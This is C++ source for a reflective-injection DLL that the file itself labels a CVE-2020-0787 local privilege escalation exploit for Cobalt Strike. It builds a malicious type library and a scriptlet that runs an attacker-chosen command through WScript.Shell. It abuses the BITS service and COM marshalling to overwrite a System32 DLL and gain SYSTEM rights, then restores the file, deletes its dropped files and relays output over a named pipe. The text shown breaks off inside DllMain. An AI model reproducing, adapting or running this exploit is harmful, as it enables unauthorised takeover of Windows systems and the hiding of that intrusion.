//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include <stdio.h>

#include <iostream>
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h> 
#include <bits.h>
#include <bits4_0.h>
#include <stdio.h>
#include <tchar.h>
#include <string>
#include <comdef.h>
#include <Shlwapi.h>
#include <strsafe.h>
#include <vector>
#include <Sddl.h>
#include <atlbase.h>
#include <shellapi.h>
#include "BitsArbitraryFileMove.h"
#define DEBUG FALSE

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//

#define TEMPO 2000
#define LEN 1024
static int FileCount = 0;
static IID IID_InterfaceTemp;
static  wchar_t g_dllPathBak[LEN];
static BSTR CleanUpFileList[3] = { L"SysFxUI.dll", L"SysFxUI.dll.bak", L"run.sct" };
static PVOID m_pOldValue = nullptr;

_COM_SMARTPTR_TYPEDEF(IBackgroundCopyJob, __uuidof(IBackgroundCopyJob));
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyManager, __uuidof(IBackgroundCopyManager));
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyJob2, __uuidof(IBackgroundCopyJob2));
_COM_SMARTPTR_TYPEDEF(IEnumBackgroundCopyJobs, __uuidof(IEnumBackgroundCopyJobs));

typedef LUID OXID;
typedef LUID OID;
typedef GUID	IPID;

typedef struct tagDUALSTRINGARRAY {
	unsigned short wNumEntries;     // Number of entries in array.
	unsigned short wSecurityOffset; // Offset of security info.
	unsigned short aStringArray[];
} DUALSTRINGARRAY;

typedef struct tagSTDOBJREF {
	DWORD   flags;
	DWORD   cPublicRefs;
	OXID           oxid;
	OID            oid;
	IPID           ipid;
} STDOBJREF;

typedef struct tagOBJREF {
	unsigned long signature;//MEOW
	unsigned long flags;
	GUID          iid;
	union {
		struct {
			STDOBJREF       std;
			DUALSTRINGARRAY saResAddr;
		} u_standard;
		struct {
			STDOBJREF       std;
			CLSID           clsid;
			DUALSTRINGARRAY saResAddr;
		} u_handler;
		struct {
			CLSID           clsid;
			unsigned long   cbExtension;
			unsigned long   size;
			ULONGLONG pData;
		} u_custom;
	} u_objref;
} OBJREF;

typedef struct ExploitData {
	;
	IID IID_Interface;
	IID TypeLib_Interface;
	OLECHAR extPath[LEN];
	OLECHAR dllPath[LEN];
	OLECHAR Interface_Name[LEN];
	UINT32 InterfaceVersionFirst;
	UINT32 InterfaceVersionNext;
}*PExploitData;

static bstr_t IIDToBSTR(REFIID riid)
{
	LPOLESTR str;
	bstr_t ret = "Unknown";
	if (SUCCEEDED(StringFromIID(riid, &str)))
	{
		ret = str;
		CoTaskMemFree(str);
	}
	return ret;
}


class SafeScopedHandle
{
	HANDLE _h;
public:
	SafeScopedHandle() : _h(nullptr)
	{
	}

	SafeScopedHandle(SafeScopedHandle& h)
	{
		_h = h._h;
		h._h = nullptr;
	}

	SafeScopedHandle(SafeScopedHandle&& h) {
		_h = h._h;
		h._h = nullptr;
	}

	~SafeScopedHandle()
	{
		if (!invalid())
		{
			CloseHandle(_h);
			_h = nullptr;
		}
	}

	bool invalid() {
		return (_h == nullptr) || (_h == INVALID_HANDLE_VALUE);
	}

	void set(HANDLE h)
	{
		_h = h;
	}

	HANDLE get()
	{
		return _h;
	}

	HANDLE* ptr()
	{
		return &_h;
	}


};





bstr_t GetSystemDrive()
{
	WCHAR windows_dir[MAX_PATH] = { 0 };

	UINT size = GetWindowsDirectory(windows_dir, MAX_PATH);
	if (size == 0) {
		printf("[-] GetWindowsDirectory error.");
	}

	windows_dir[2] = 0;

	return windows_dir;
}

bstr_t GetDeviceFromPath(LPCWSTR lpPath)
{
	WCHAR drive[3] = { 0 };
	drive[0] = lpPath[0];
	drive[1] = lpPath[1];
	drive[2] = 0;

	WCHAR device_name[MAX_PATH] = { 0 };

	if (QueryDosDevice(drive, device_name, MAX_PATH))
	{
		return device_name;
	}
	else
	{
		//fflush(stdout);
		if (DEBUG) {
			printf("[-] Error getting device for %ls\n", lpPath);
		}

		exit(1);
	}
}

bstr_t GetSystemDevice()
{
	return GetDeviceFromPath(GetSystemDrive());
}

bstr_t GetExe()
{
	WCHAR curr_path[MAX_PATH] = { 0 };
	GetModuleFileName(nullptr, curr_path, MAX_PATH);
	//printf("curr_path: %ls \n", curr_path);
	return curr_path;
}

bstr_t GetExeDir()
{
	//GetModuleFileName(nullptr, curr_path, MAX_PATH); // 获取当前进程已加载模块的文件的完整路径
	//PathRemoveFileSpec(curr_path);  //从路径中删除尾随文件名和反斜杠（如果存在）。
	
	DWORD dwRet = 0;
	WCHAR publicPath[MAX_PATH] = { 0 };
	dwRet = GetTempPath(MAX_PATH, publicPath);
	if (dwRet == 0) {
		printf("[-] GetTempPath failed,code:%d ,unset publicPath \n", GetLastError());
		ZeroMemory(publicPath, MAX_PATH);
		StringCchCat(publicPath, MAX_PATH, L"C:\\Users\\Public\\Downloads\\");
	}
	PathRemoveFileSpec(publicPath);
	return publicPath;
}

bstr_t GetCurrentPath()
{
	bstr_t curr_path = GetExeDir();

	bstr_t ret = GetDeviceFromPath(curr_path);

	ret += &curr_path.GetBSTR()[2];

	return ret;
}


static HRESULT Check(HRESULT hr)
{
	if (FAILED(hr))
	{
		throw _com_error(hr);
	}
	return hr;
}


// {D487789C-32A3-4E22-B46A-C4C4C1C2D3E0}
static const GUID IID_BaseInterface =
{ 0xd487789c, 0x32a3, 0x4e22, { 0xb4, 0x6a, 0xc4, 0xc4, 0xc1, 0xc2, 0xd3, 0xe0 } };

// {6C6C9F33-AE88-4EC2-BE2D-449A0FFF8C02}
static const GUID TypeLib_BaseInterface =
{ 0x6c6c9f33, 0xae88, 0x4ec2, { 0xbe, 0x2d, 0x44, 0x9a, 0xf, 0xff, 0x8c, 0x2 } };

const wchar_t x[] = L"ABC";

const wchar_t scriptlet_start[] = L"<?xml version='1.0'?>\r\n<package>\r\n<component id='giffile'>\r\n<registration description='Dummy' progid='giffile' version='1.00' remotable='True'>\r\n</registration>\r\n<script language='JScript'>\r\n<![CDATA[\r\n  new ActiveXObject('Wscript.Shell').exec('";

const wchar_t scriptlet_end[] = L"');\r\n]]>\r\n</script>\r\n</component>\r\n</package>\r\n";


class ChaHua
{
	
	BSTR target_tlb_dest = (BSTR)malloc(LEN);
	PExploitData data = (PExploitData)malloc(sizeof(ExploitData));

	~ChaHua() {};
public:

	ChaHua(IID IID_IInterface, BSTR IInterface_name, IID IID_TypeLib, BSTR dllPathFrom)
	{

		data->IID_Interface = IID_IInterface;
		if (IInterface_name)
		{
			wcscpy(data->Interface_Name, IInterface_name);
		}

		data->TypeLib_Interface = IID_TypeLib;
		if (dllPathFrom)
		{
			wcscpy(data->dllPath, dllPathFrom);
		}
		else
		{
			wcscpy(data->dllPath, L"");
		}

		wcscpy(data->extPath, L"");

	}



	HRESULT Init()
	{
		return  S_OK;
	}
	GUID* GetFakeIID_IInterface()
	{
		return &data->IID_Interface;
	}

	void MakeTempTypelib(bstr_t filename, bstr_t if_name, REFGUID typelib_guid, REFGUID iid, ITypeLib* ref_typelib, REFGUID ref_iid)
	{
		DeleteFile(filename);
		ICreateTypeLib2Ptr tlb;
		Check(CreateTypeLib2(SYS_WIN32, filename, &tlb));
		//Check(CreateTypeLib2(SYS_WIN64, filename, &tlb));
		tlb->SetGuid(typelib_guid);

		ITypeInfoPtr ref_type_info;
		Check(ref_typelib->GetTypeInfoOfGuid(ref_iid, &ref_type_info));

		ICreateTypeInfoPtr create_info;
		Check(tlb->CreateTypeInfo(if_name, TKIND_INTERFACE, &create_info));
		Check(create_info->SetTypeFlags(TYPEFLAG_FDUAL | TYPEFLAG_FOLEAUTOMATION));
		HREFTYPE ref_type;
		Check(create_info->AddRefTypeInfo(ref_type_info, &ref_type));
		Check(create_info->AddImplType(0, ref_type));
		Check(create_info->SetGuid(iid));
		Check(tlb->SaveAllChanges());
	}

	std::vector<BYTE> ReadFileByPath(bstr_t path)
	{
		SafeScopedHandle hFile;
		hFile.set(CreateFile(path, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr));
		if (hFile.invalid())
		{
			throw _com_error(E_FAIL);
		}
		DWORD size = GetFileSize(hFile.get(), nullptr);
		std::vector<BYTE> ret(size);
		if (size > 0)
		{
			DWORD bytes_read;
			if (!ReadFile(hFile.get(), ret.data(), size, &bytes_read, nullptr) || bytes_read != size)
			{
				throw _com_error(E_FAIL);
			}
		}

		return ret;
	}

	void WriteFileByString(bstr_t path, const char* data)
	{
		const BYTE* bytes = reinterpret_cast<const BYTE*>(data);
		std::vector<BYTE> data_buf(bytes, bytes + strlen(data));
		WriteFileByData(path, data_buf);
	}
	void WriteFileByData(bstr_t path, const std::vector<BYTE> data)
	{
		SafeScopedHandle hFile;
		hFile.set(CreateFile(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr));
		if (hFile.invalid())
		{
			throw _com_error(E_FAIL);
		}

		if (data.size() > 0)
		{
			DWORD bytes_written;
			if (!WriteFile(hFile.get(), data.data(), data.size(), &bytes_written, nullptr) || bytes_written != data.size())
			{
				throw _com_error(E_FAIL);
			}
		}
	}

	BOOL ExploitCopyFile(bool shellmode) {
		
		BitsArbitraryFileMove bitsArbitraryFileMove;
		char* cmdstr = (char*)malloc(LEN);
		bstr_t dllPathBak = GetExeDir() + L"\\" + PathFindFileName(data->dllPath) + ".bak";

		wcscpy(g_dllPathBak, dllPathBak.GetBSTR());

		if (DEBUG) {
			printf("[*] I in ExpCopyfile. \n");
		}
		
		if (!CopyFileW(data->dllPath, g_dllPathBak, false))
		{
			if (DEBUG) {
				printf("[*] Copy Back File Failed \n");
			}
			return FALSE;
		}
		
		return bitsArbitraryFileMove.Run(target_tlb_dest, data->dllPath);
	}

	void BuildTypeLibsWrapper(BSTR script_path, wchar_t* program, wchar_t* parameters)
	{
		//当前目录下的临时typelib
		bstr_t target_tlb = GetExeDir() + L"\\" + PathFindFileName(data->dllPath);
		if (DEBUG) {
			printf("[+] Building TypeLib:%ls \n", target_tlb.GetBSTR());
		}
		bstr_t script;
		if (script_path)
		{
			script = script_path;
		}
		else
		{
			script = L"script:" + CreateScriptletFile(program, parameters);
		}
		BuildTypeLibs(script, data->Interface_Name, target_tlb);
		wcscpy(target_tlb_dest, target_tlb.GetBSTR());
	}

	BSTR GetDllPath()
	{
		return _wcsdup(data->dllPath);
	}
	void BuildTypeLibs(LPCSTR script_path, bstr_t if_name, bstr_t target_tlb)
	{
		try {
			ITypeLibPtr stdole2;
			Check(LoadTypeLib(L"stdole2.tlb", &stdole2));
			//fflush(stdout);
			unsigned int len = strlen(script_path);

			bstr_t buf = GetExeDir() + L"\\";
			for (unsigned int i = 0; i < len; ++i)
			{
				buf += L"A";
			}

			MakeTempTypelib(buf, "IBadger", TypeLib_BaseInterface, IID_BaseInterface, stdole2, IID_IDispatch);
			ITypeLib* abc;
			Check(LoadTypeLib(buf, &abc));

			bstr_t built_tlb = GetExeDir() + L"\\output.tlb";
			MakeTempTypelib(built_tlb, if_name, data->TypeLib_Interface, data->IID_Interface, abc, IID_BaseInterface);
			std::vector<BYTE> tlb_data = ReadFileByPath(built_tlb);
			for (size_t i = 0; i < tlb_data.size() - len; ++i)
			{
				bool found = true;
				for (unsigned int j = 0; j < len; j++)
				{
					if (tlb_data[i + j] != 'A')
					{
						found = false;
					}
				}

				if (found)
				{
					if (DEBUG) {
						printf("[+] Typelib:%s,%ls,%ls \n", script_path, if_name.GetBSTR(), IIDToBSTR(data->TypeLib_Interface).GetBSTR());
					}
					memcpy(&tlb_data[i], script_path, len);
					break;
				}
			}
			WriteFileByData(target_tlb, tlb_data);
			abc->Release();
			DeleteFile(buf);
			DeleteFile(built_tlb);
		}
		catch (const _com_error& err)
		{
			if (DEBUG) {
				printf("[+] Error BuildT ypeLibs: %ls\n", err.ErrorMessage());
			}
		}
	}

	bstr_t CreateScriptletFile(wchar_t* program, wchar_t* parameters)
	{
		bstr_t script_file = GetExeDir() + L"\\run.sct";
		bstr_t script_data = scriptlet_start;
		bstr_t exe_program;
		bstr_t exe_parameters;
		// bstr_t exe_file = GetExe();   // C:\Windows\syswow64\dllhost.exe 
		//exe_file = L"C:/Windows/system32/calc.exe";
		exe_program = (_bstr_t)program;
		exe_parameters = (_bstr_t)parameters;


		// 把\\转换成/ 
		wchar_t* p = exe_program;
		while (*p)
		{
			if (*p == '\\')
			{
				*p = '/';
			}
			p++;
		}
		DWORD session_id;
		ProcessIdToSessionId(GetCurrentProcessId(), &session_id); //GetCurrentProcessId是获取当前进程一个唯一的标识符
		WCHAR session_str[16];
		StringCchPrintf(session_str, _countof(session_str), L"%d", session_id);

		//script_data += L"\"" + exe_file + L"\" door " + session_str + scriptlet_end;
		//script_data += L"\"" + exe_file + L"\" /c whoami \> C:\\\\66.txt" + scriptlet_end;
		script_data += L"\"" + exe_program + L"\" "+ exe_parameters +"" + scriptlet_end;  //
		

		WriteFileByString(script_file, script_data); //WriteFileByString以字符串为单位将内容写到文件中,  WriteFileByBytes()方法以字节为单位将内容写到文件中

		return script_file;
	}

};

class CMarshaller : public IMarshal
{
	LONG _ref_count;
	IUnknown* _unk;

	~CMarshaller() {}

public:

	CMarshaller(IUnknown* unk) : _ref_count(1)
	{
		_unk = unk;

	}


	virtual HRESULT STDMETHODCALLTYPE QueryInterface(
		/* [in] */ REFIID riid,
		/* [iid_is][out] */ _COM_Outptr_ void __RPC_FAR* __RPC_FAR* ppvObject)
	{

		*ppvObject = nullptr;
		//printf("[+]QI [CMarshaller] - Marshaller: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);

		if (riid == IID_IUnknown)
		{
			*ppvObject = this;
		}
		else if (riid == IID_IMarshal)
		{
			*ppvObject = static_cast<IMarshal*>(this);
		}
		else
		{
			return E_NOINTERFACE;
		}
		//printf("[+]Queried Success: %p\n", *ppvObject);
		((IUnknown*)*ppvObject)->AddRef();
		return S_OK;
	}

	virtual ULONG STDMETHODCALLTYPE AddRef(void)
	{

		//printf("[+]AddRef: %d\n", _ref_count);
		return InterlockedIncrement(&_ref_count);
	}

	virtual ULONG STDMETHODCALLTYPE Release(void)
	{

		//printf("[+]Release: %d\n", _ref_count);
		ULONG ret = InterlockedDecrement(&_ref_count);
		if (ret == 0)
		{
			//printf("[+]Release object %p\n", this);
			delete this;
		}
		return ret;
	}



	virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void* pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void* pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  CLSID* pCid)
	{


		GUID CLSID_AggStdMarshal2 = { 0x00000027, 0x0000, 0x0008, { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
		*pCid = CLSID_AggStdMarshal2;

		//printf("[+]GetUnmarshalClass: %ls %p\n", IIDToBSTR((REFIID)*pCid).GetBSTR(), this);
		return S_OK;
	}
	virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream* pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void* pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void* pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags)
	{
		IStorage* stg;
		ILockBytes* lb;
		CreateILockBytesOnHGlobal(nullptr, TRUE, &lb);
		StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);
		ULONG cbRead;
		ULONG cbWrite;
		IStreamPtr pStream = nullptr;
		HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &pStream);
		LARGE_INTEGER dlibMove = { 0 };
		ULARGE_INTEGER plibNewPosition;
		hr = CoMarshalInterface(pStream, IID_IUnknown, static_cast<IUnknownPtr>(stg), dwDestContext, pvDestContext, mshlflags);
		OBJREF* headerObjRef = (OBJREF*)malloc(1000);
		hr = pStream->Seek(dlibMove, STREAM_SEEK_SET, &plibNewPosition);
		hr = pStream->Read(headerObjRef, 1000, &cbRead);
		//printf("[+]MarshalInterface: %ls %p\n", IIDToBSTR(IID_InterfaceTemp).GetBSTR(), this);
		headerObjRef->iid = IID_InterfaceTemp;
		hr = pStm->Write(headerObjRef, cbRead, &cbWrite);
		return hr;

	}


	virtual HRESULT STDMETHODCALLTYPE GetMarshalSizeMax(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void* pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void* pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  DWORD* pSize)
	{
		*pSize = 1024;
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE UnmarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream* pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][out] */
		_Outptr_  void** ppv)
	{
		return E_NOTIMPL;
	}

	virtual HRESULT STDMETHODCALLTYPE ReleaseMarshalData(
		/* [annotation][unique][in] */
		_In_  IStream* pStm)
	{
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE DisconnectObject(
		/* [annotation][in] */
		_In_  DWORD dwReserved)
	{
		return S_OK;
	}
};







class FakeObject : public IBackgroundCopyCallback2, public IPersist
{
	HANDLE m_ptoken;
	LONG m_lRefCount;

	IUnknown* _umk;
	~FakeObject() {};

public:
	//Constructor, Destructor
	FakeObject(IUnknown* umk) {
		_umk = umk;
		m_lRefCount = 1;

	}

	//IUnknown
	HRESULT __stdcall QueryInterface(REFIID riid, LPVOID* ppvObj)
	{
		if (DEBUG) {
			printf("[*] QI [FakeObject] - Marshaller: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);
		}
		if (riid == __uuidof(IUnknown))
		{
			if (DEBUG) {
				printf("[*] Query for IUnknown \n");
			}
			*ppvObj = this;
		}
		else if (riid == __uuidof(IBackgroundCopyCallback2))
		{
			if (DEBUG) {
				printf("[*] Query for IBackgroundCopyCallback 2\n");
			}

		}
		else if (riid == __uuidof(IBackgroundCopyCallback))
		{
			//printf("[+] Query for IBackgroundCopyCallback\n");

		}
		else if (riid == __uuidof(IPersist))
		{
			if (DEBUG) {
				printf("[*] Query for IPersist\n");
			}
			*ppvObj = static_cast<IPersist*>(this);
			//*ppvObj = _unk2;
		}

		else if (riid == IID_IMarshal)
		{
			if (DEBUG) {
				printf("[*] Query for IID_IMarshal\n");
			}
			//*ppvObj = static_cast<IBackgroundCopyCallback2*>(this);


			*ppvObj = NULL;
			return E_NOINTERFACE;
		}
		else
		{
			if (DEBUG) {
				printf("[-] Unknown IID: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);
			}
			*ppvObj = NULL;
			return E_NOINTERFACE;
		}

		((IUnknown*)*ppvObj)->AddRef();
		return NOERROR;
	}

	ULONG __stdcall AddRef()
	{
		return InterlockedIncrement(&m_lRefCount);
	}

	ULONG __stdcall Release()
	{
		ULONG  ulCount = InterlockedDecrement(&m_lRefCount);

		if (0 == ulCount)
		{
			delete this;
		}

		return ulCount;
	}

	virtual HRESULT STDMETHODCALLTYPE JobTransferred(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob* pJob)
	{
		//printf("[+]JobTransferred\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE JobError(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob* pJob,
		/* [in] */ __RPC__in_opt IBackgroundCopyError* pError)
	{
		//printf("[+]JobError\n");
		return S_OK;
	}


	virtual HRESULT STDMETHODCALLTYPE JobModification(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob* pJob,
		/* [in] */ DWORD dwReserved)
	{
		//printf("[+]JobModification\n");
		return S_OK;
	}


	virtual HRESULT STDMETHODCALLTYPE FileTransferred(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob* pJob,
		/* [in] */ __RPC__in_opt IBackgroundCopyFile* pFile)
	{
		//printf("[+]FileTransferred\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE GetClassID(
		/* [out] */ __RPC__out CLSID* pClassID)
	{
		//printf("[+]GetClassID\n");


		*pClassID = GUID_NULL;

		return S_OK;
	}
};



_COM_SMARTPTR_TYPEDEF(IEnumBackgroundCopyJobs, __uuidof(IEnumBackgroundCopyJobs));

void TestBits(HANDLE hEvent)
{
	if (DEBUG) {
		printf("[+] In TestBits \n");
	}
	IBackgroundCopyManagerPtr pQueueMgr;
	IID CLSID_BackgroundCopyManager;
	IID IID_IBackgroundCopyManager;
	CLSIDFromString(L"{4991d34b-80a1-4291-83b6-3328366b9097}", &CLSID_BackgroundCopyManager);
	CLSIDFromString(L"{5ce34c0d-0dc9-4c1f-897c-daa1b78cee7c}", &IID_IBackgroundCopyManager);

	HRESULT	hr = CoCreateInstance(CLSID_BackgroundCopyManager, NULL,
		CLSCTX_ALL, IID_IBackgroundCopyManager, (void**)&pQueueMgr);

	IUnknown* pOuter = new CMarshaller(static_cast<IPersist*>(new FakeObject(nullptr)));
	IUnknown* pInner;

	CoGetStdMarshalEx(pOuter, CLSCTX_INPROC_SERVER, &pInner);

	IBackgroundCopyJobPtr pJob;
	GUID guidJob;

	IEnumBackgroundCopyJobsPtr enumjobs;
	hr = pQueueMgr->EnumJobs(0, &enumjobs);
	if (SUCCEEDED(hr))
	{
		IBackgroundCopyJob* currjob;
		ULONG fetched = 0;

		while ((enumjobs->Next(1, &currjob, &fetched) == S_OK) && (fetched == 1))
		{
			LPWSTR lpStr;
			if (SUCCEEDED(currjob->GetDisplayName(&lpStr)))
			{
				if (wcscmp(lpStr, L"BitsAuthSample") == 0)
				{
					CoTaskMemFree(lpStr);
					currjob->Cancel();
					currjob->Release();
					break;
				}
			}
			currjob->Release();
		}
	}


	pQueueMgr->CreateJob(L"BitsAuthSample",
		BG_JOB_TYPE_DOWNLOAD,
		&guidJob,
		&pJob);



	IUnknownPtr pNotify;


	pNotify.Attach(new CMarshaller(pInner));
	{


		HRESULT hr = pJob->SetNotifyInterface(pNotify);
		if (DEBUG) {
			printf("[+] Test Background Intelligent Transfer Service Result: %08X\n", hr);
		}

	}
	if (pJob)
	{
		pJob->Cancel();
	}

	//printf("[+]Done\n");
	SetEvent(hEvent);

}



BOOL  DirectoryListCleanUp_After(BSTR Path, BSTR ExeName)
{
	
	if (!PathIsDirectoryW(Path))
	{
		return FALSE;
	}
	WIN32_FIND_DATAW FindData;
	HANDLE hError;

	BSTR FilePathName = (BSTR)malloc(LEN);
	// 构造路径
	bstr_t FullPathName;
	wcscpy(FilePathName, Path);
	wcscat(FilePathName, L"\\*.*");
	hError = FindFirstFile(FilePathName, &FindData);
	if (hError == INVALID_HANDLE_VALUE)
	{
		//printf("[+] Enumerating %ls Failed Try To Skip, code: %d,error: %d\n", FilePathName, GetLastError(), hError);
		return 0;
	}
	while (::FindNextFile(hError, &FindData))
	{
		// 过虑.和..
		if (_wcsicmp(FindData.cFileName, L".") == 0
			|| _wcsicmp(FindData.cFileName, L"..") == 0)
		{
			continue;
		}
		FullPathName = bstr_t(Path) + "\\" + FindData.cFileName;
		// 构造完整路径,不删除当前的exe文件，只删除释放的其他文件，这里是个比较。
		if (_wcsicmp(ExeName, FindData.cFileName) != 0)
		{
			for (int i = 0; i < 3; i++)
			{
				if (_wcsicmp(CleanUpFileList[i], FindData.cFileName) == 0)
				{
					DeleteFile(FullPathName);
				}
			}
		}
		wsprintf(FullPathName, L"%s\\%s", Path, FindData.cFileName);
		//FileCount++;
		// 输出本级的文件

		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			DirectoryListCleanUp_After(FullPathName, ExeName);
		}
	}
	return FALSE;
}


BOOL RestoreExploitFile_After(bool shellmode, BSTR dllBakPath, BSTR dllRealPath)
{
	PVOID oldval = nullptr;

	HANDLE hProcess;
	BOOL bWow64Process;

	hProcess = GetCurrentProcess();

	if (!IsWow64Process(hProcess, &bWow64Process))
	{
		//wprintf_s(L"[!] IsWow64Process() failed (Err: %d).\n", GetLastError());
		CloseHandle(hProcess);
		return FALSE;
	}

	if (shellmode)
	{
		if (bWow64Process)
		{
			if (!Wow64DisableWow64FsRedirection(&oldval))
			{
				if (DEBUG) {
					printf("[-] Wow64DisableWow64FsRedirection Failed\n");
				}
				return FALSE;
			}
		}

	}
	if (DEBUG) {
		printf("[+] Restoring File %ls,%ls\n", dllBakPath, dllRealPath);
	}
	if (CopyFileW(dllBakPath, dllRealPath, false))
	{
		bstr_t exeDir = GetExeDir();
		bstr_t exeName = PathFindFileName(GetExe());  // C:\Windows\syswow64\dllhost.exe 
		if (DEBUG) {
			printf("[+] Restoring BackUp DLL Done,Do CleanUp... \n");
		}
		DirectoryListCleanUp_After(exeDir, exeName);
		if (shellmode && bWow64Process)
		{
			Wow64RevertWow64FsRedirection(oldval);

		}
		return TRUE;
	}
	else
	{
		if (shellmode && bWow64Process)
		{
			Wow64RevertWow64FsRedirection(oldval);

		}
		if (DEBUG) {
			printf("[+] Run Exploit Failed,Check Run As Administrator \n");
		}
		return  FALSE;
	}

}

BOOL exploit(wchar_t* program, wchar_t* parameters)
{
	try
	{
		IID TypeLib_InterfaceTemp;
		BSTR pwszEvilDllPath = L"C:\\Windows\\System32\\SysFxUI.dll";
		BSTR if_name = L"IMyPageFactory";
		HRESULT hr = CoInitialize(NULL);
		HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
		CLSIDFromString(L"{E6DB299B-B925-415A-879B-4A76D072F39A}", &IID_InterfaceTemp);
		CLSIDFromString(L"{87D5F036-FAC3-4390-A1E8-DFA8A62C09E7}", &TypeLib_InterfaceTemp);
		ChaHua* exp = new ChaHua(IID_InterfaceTemp, if_name, TypeLib_InterfaceTemp, pwszEvilDllPath);
		
		exp->BuildTypeLibsWrapper(nullptr, program, parameters);
		if (DEBUG) {
			printf("[*] Do Exp CopyFile.\n ");
		}
		if (exp->ExploitCopyFile(TRUE))
		{
			TestBits(hEvent);
		}
	}
	catch (const _com_error& err)
	{
		if (DEBUG) {
			printf("[-] Error: %ls\n", err.ErrorMessage());
		}
	}
	CoUninitialize();//释放COM
	return TRUE;
}

/// <summary>
/// 检查当前用户权限
/// </summary>
/// <returns></returns>
BOOL CurrentUserIsLocalSystem()
{
	BOOL bIsLocalSystem = FALSE;
	PSID psidLocalSystem;
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
	BOOL fSuccess = AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &psidLocalSystem);
	if (fSuccess)
	{
		fSuccess = CheckTokenMembership(0, psidLocalSystem, &bIsLocalSystem);
		FreeSid(psidLocalSystem);
	}
	return bIsLocalSystem;
}

/// <summary>
/// 创建PIPE管道监听
/// </summary>
/// <returns></returns>
BOOL Pipestdout() {
	HANDLE hPipe;
	int a = 0;
	char buffer[1024];
	DWORD dwRead;
	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\8e8988b257e9dd2ea44ff03d44d26467b7c9ec16"),
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, // FILE_FLAG_FIRST_PIPE_INSTANCE is not needed but forces CreateNamedPipe(..) to fail if the pipe already exists...
		1,
		1024 * 16,
		1024 * 16,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	while (hPipe != INVALID_HANDLE_VALUE)
	{
		printf("[*] ConnectNamedPipe \"8e8988b257e9dd2ea44ff03d44d26467b7c9ec16\" Wait...\n");
		fflush(stdout);
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)   //wait for someone to connect to the pipe,阻塞
		{
			printf("[+] =-======================================================================-=\n");
			while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE)
			{
				/* add terminating zero */
				buffer[dwRead] = '\0';
				/* do something with data in buffer */
				if (strlen(buffer) < 3 ) {
					continue;
				}
				else {
					printf("%s\n", buffer);
				}
			}
			printf("[+] =-======================================================================-=\n");
		}
		if (DisconnectNamedPipe(hPipe)) {
			printf("[*] DisconnectNamedPipe Successful.\n");
			CloseHandle(hPipe);
			return TRUE;
		}
		CloseHandle(hPipe);
		return FALSE;
	}
	return FALSE;
}

wchar_t* c2w(char* lpReserved) {
	const size_t scl = strlen(lpReserved) + 1;
	wchar_t* wchar_line = new wchar_t[scl];
	mbstowcs(wchar_line, lpReserved, scl);
	return wchar_line;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	HANDLE threadHandle;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL)
		{
			*(HMODULE*)lpReserved = hAppInstance;
		}
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		printf("[*] CVE-2020-0787 LPE Exp For Cobalt Strike.\n"); 
		fflush(stdout);
